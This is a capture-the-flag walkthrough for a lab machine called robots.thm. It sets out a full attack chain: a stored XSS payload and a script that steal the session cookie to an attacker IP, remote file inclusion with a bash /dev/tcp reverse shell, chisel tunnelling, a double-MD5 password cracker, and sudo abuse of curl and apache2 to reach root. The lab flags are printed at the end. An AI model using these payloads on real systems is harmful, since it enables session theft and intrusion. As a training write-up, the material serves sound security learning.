# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |
| 9000 | http    |

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.61
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.61 (Debian)
| http-robots.txt: 3 disallowed entries
|_/harming/humans /ignoring/human/orders /harm/to/self
9000/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: robots.thm
```


# RECONNAISSANCE
---

Let's begin, first thing we notice in the scan is that `robots.txt` entrance is allowed at port 80, we check three directories:

```
/harming/humans
/ignoring/human/orders
/harm/to/self
```


If we go to `/harm/to/self`, we get redirected to `robots.thm`, let's add it to `/etc/hosts`:

```
echo '10.10.45.12 robots.thm' | sudo tee -a /etc/hosts
```

![Pasted image 20250314141610.png](../../IMAGES/Pasted%20image%2020250314141610.png)

If we go to register, we can see this:

![Pasted image 20250314141630.png](../../IMAGES/Pasted%20image%2020250314141630.png)

We can try registering a username and check the behavior, the way the password gets structured the first time is already told by the page, this is a big hint, let's keep on going, for example, let's create an account with these credentials:

```
testuser:05/05/2000
```

Now, let's try to log in and see the response:

```
echo -n "testuser0505" | md5sum
20baf68c53da16fffc91660efd9ef401
```


![Pasted image 20250314150509.png](../../IMAGES/Pasted%20image%2020250314150509.png)

We get a redirection to `index.php`, we can also see something interesting in here:

![Pasted image 20250314150624.png](../../IMAGES/Pasted%20image%2020250314150624.png)

We got something called `server_info`, something way too interesting in here is this:

![Pasted image 20250314150733.png](../../IMAGES/Pasted%20image%2020250314150733.png)

For example `allow_url_fopen`, `allow_url_include` and `file_uploads` are enabled, this means that this page could be vulnerable to LFI, let's try to search for a way to exploit this. 

# EXPLOITATION
---

Going back at the register page, I tried registering an username using `xss`, a simple xss payload at the username, then, i tried logging in and this happened:

![Pasted image 20250314181227.png](../../IMAGES/Pasted%20image%2020250314181227.png)

There we go, XSS is possible in this page, we can craft a payload to get admin
cookie and bypass the login page, let's register a username with these credentials:

```
<script>fetch("http://10.6.34.159:8000/?cookie="+document.cookie)</script>:01/01/2000
```

Now, we must convert this to get our md5 password:

```
echo -n "<script>fetch("http://10.6.34.159:8000/?cookie="+document.cookie)</script>0101" | md5sum
```

If we try getting our cookie, we are unable to do so, due to this:


![Pasted image 20250317143641.png](../../IMAGES/Pasted%20image%2020250317143641.png)

The `HttpOnly` flag is set in the server, this prevents JS to access the cookie, we can exploit this in other way though, let's use this script:

```js
var url = "http://robots.thm/harm/to/self/server_info.php";
var attacker = "http://10.6.34.159/exfil";
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
        if (match) {
            fetch(attacker + "?cookie=" + match[1]);
        }
    }
}

xhr.open('GET', url, true);
xhr.send(null);
```

We can find this in HackTricks, we just needed to adapt the content to steal the cookie only:

![Pasted image 20250317143941.png](../../IMAGES/Pasted%20image%2020250317143941.png)


Now, let's register an username with the following:

```
<script src="http://10.6.34.159/cookie_steal.js"></script>
```


![Pasted image 20250317144124.png](../../IMAGES/Pasted%20image%2020250317144124.png)


We can see this in our python server:

![Pasted image 20250317144147.png](../../IMAGES/Pasted%20image%2020250317144147.png)

Got our cookie:

```
6p7hh3m9oh0shm3icts9c1qt2h
```

Let's change our value and login as admin:


![Pasted image 20250317144245.png](../../IMAGES/Pasted%20image%2020250317144245.png)

We find out a test URL site, we can try some techniques such as trying the LFI, let's try, first, let's set up a python server and point out our own URL:

![Pasted image 20250317151014.png](../../IMAGES/Pasted%20image%2020250317151014.png)

We get a directory listing for our server, we can try exploiting this with the inclusion we found on the `server_info.php` file, let's try some basic RCE:


```PHP
<?php
system('id');
?>
```

Let's save that file as `id.php` and send the request pointing that resource:

![Pasted image 20250317151210.png](../../IMAGES/Pasted%20image%2020250317151210.png)

There we go, we got RCE, let's send a shell:

```php
<?php system('bash -c "bash -i >& /dev/tcp/10.6.34.159/4444 0>&1"'); ?>
```

Let's save it as `shell.php` and do the same, we also need to set up a listener.

![Pasted image 20250317151521.png](../../IMAGES/Pasted%20image%2020250317151521.png)

There we go, we got our shell, let's start privesc.



# PRIVILEGE ESCALATION
---

Let's start by stabilizing our shell:


1. /usr/bin/script -qc /bin/bash /dev/null
2. CTRL + Z
3. stty raw -echo; fg
4. reset xterm
5. export TERM=xterm
6. export BASH=bash

![Pasted image 20250317152103.png](../../IMAGES/Pasted%20image%2020250317152103.png)

We got a stable shell now, let's look around, we got this:

![Pasted image 20250317152134.png](../../IMAGES/Pasted%20image%2020250317152134.png)

Got a `config.php` file, let's read it:

![Pasted image 20250317152150.png](../../IMAGES/Pasted%20image%2020250317152150.png)

Found ourselves credentials:

```
robots:q4qCz1OflKvKwK4S
```

If we try these credentials in ssh, they don't work, we need to keep searching around, for example, at `/`, we find this:

![Pasted image 20250317152505.png](../../IMAGES/Pasted%20image%2020250317152505.png)

We found a `.dockerenv` file, this could mean we are inside of a docker environment, let's search `/etc/hosts`:


![Pasted image 20250317152549.png](../../IMAGES/Pasted%20image%2020250317152549.png)

And it was right, we are inside of a docker container, we can try using [chisel](https://github.com/jpillora/chisel), let's do the following:

```
./chisel server --reverse --port 51234
```


Now, we need to download the chisel binary on our target machine and do this, `wget` is not enabled in the machine so we need to do it by curl, we also need to see where is the db located at so let's do this first:

```
www-data@robots:/tmp$ getent hosts db
172.18.0.3      db
```

```
curl http://10.6.34.159:8000/chisel -o chisel
chmod +x chisel
./chisel client 10.6.34.159:51234 R:3306:172.18.0.3:3306
```

We now receive a connection in our local machine chisel:

![Pasted image 20250317154806.png](../../IMAGES/Pasted%20image%2020250317154806.png)


We can now access the db:

![Pasted image 20250317155125.png](../../IMAGES/Pasted%20image%2020250317155125.png)


We can find this inside the db:

![Pasted image 20250317155227.png](../../IMAGES/Pasted%20image%2020250317155227.png)

We got the password for another user `rgiskard`, the interesting thing in here is that the md5 hash does not coincide with the one registered at the site, so, we need to reconstruct the hash, for this, we must understand the hash, let's go to CyberChef to analyze our hash, let's remember that we set the script account with the date of `01/01/2000`, so we need to do the hash like this:


![Pasted image 20250317155600.png](../../IMAGES/Pasted%20image%2020250317155600.png)

If we use MD5 again:

![Pasted image 20250317155615.png](../../IMAGES/Pasted%20image%2020250317155615.png)


Now, this do match the hash in the db, let's use this python script to reconstruct the hash:

```python
import hashlib
import sys

def find_matching_double_md5(username, target_hash):
    if not username:
        print("Username must be provided")
        return
    
    for day in range(1, 32):
        for month in range(1, 13):
            # Format day and month to ddmm
            ddmm = f"{day:02d}{month:02d}"
            # Concatenate username with ddmm
            combined_string = username + ddmm
            
            # First MD5 hash
            first_md5 = hashlib.md5(combined_string.encode()).hexdigest()
            
            # Second MD5 hash
            double_md5 = hashlib.md5(first_md5.encode()).hexdigest()
            
            if double_md5 == target_hash:
                print(f"\nMatch found:")
                print(f"Combined string: {combined_string}")
                print(f"First MD5: {first_md5}")
                print(f"Double MD5: {double_md5}")
                return

    print("No match found")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <username> <target_hash>")
        sys.exit(1)

    username = sys.argv[1]
    target_hash = sys.argv[2]
    find_matching_double_md5(username, target_hash)
```

We need to use it in the format of `username`, `target_hash`:


```
python3 reconstruct.py rgiskard dfb35334bf2a1338fa40e5fbb4ae4753

Match found:
Combined string: rgiskard2209
First MD5: b246f21ff68cae9503ed6d18edd32dae
Double MD5: dfb35334bf2a1338fa40e5fbb4ae4753
```

We got the password, let's go into ssh, we need to use the first MD5 hash:

![Pasted image 20250317155933.png](../../IMAGES/Pasted%20image%2020250317155933.png)

Let's check our privileges:

![Pasted image 20250317160010.png](../../IMAGES/Pasted%20image%2020250317160010.png)

We can use `curl` with wildcard as the user `dolivaw`, let's check GTFOBINS:

![Pasted image 20250317164324.png](../../IMAGES/Pasted%20image%2020250317164324.png)

Let's reproduce these steps, for example, the right path to go would be testing how this works first, let's point out at a test resource:

```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ -o /tmp/test.txt
```

If we check the file now:

![Pasted image 20250317164513.png](../../IMAGES/Pasted%20image%2020250317164513.png)

But, what we need to find is who this file belongs to, either `dolivaw` or our user:

![Pasted image 20250317164614.png](../../IMAGES/Pasted%20image%2020250317164614.png)

It belongs to the `dolivaw` user, we can use this to escalate our privileges by modifying the authorized keys in ssh:

```
ssh-keygen
```

```
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://10.6.34.159:8000/id_rsa.pub -o id_rsa -o /home/dolivaw/.ssh/authorized_keys -k
```

And now, we can login as `dolivaw` using this:

```
sudo ssh dolivaw@robots.thm -i id_rsa
```

![Pasted image 20250317165458.png](../../IMAGES/Pasted%20image%2020250317165458.png)

At this point we can read `user.txt` but let's continue onto root, let's check our privileges:


![Pasted image 20250317165535.png](../../IMAGES/Pasted%20image%2020250317165535.png)

Let's search this on GTFOBINS:


![Pasted image 20250317165608.png](../../IMAGES/Pasted%20image%2020250317165608.png)

We can read the root flag with this:

```
sudo /usr/sbin/apache2 -c "Include /root/root.txt" -k stop   

sudo -u root /usr/sbin/apache2 -C "DEFINE APACHE_RUN_DIR /tmp" -C "Include /root/root.txt" -k stop
```

And we get this:

![Pasted image 20250317170005.png](../../IMAGES/Pasted%20image%2020250317170005.png)

We got our root flag, this is the short path, we can get a root shell exploiting this too, but for the simplicity of things, let's just read the root flag and end the CTF.


```
dolivaw@ubuntu-jammy:~$ cat user.txt
THM{9b17d3c3e86c944c868c57b5a7fa07d8}
```

```
root.txt: THM{2a279561f5eea907f7617df3982cee24}
```


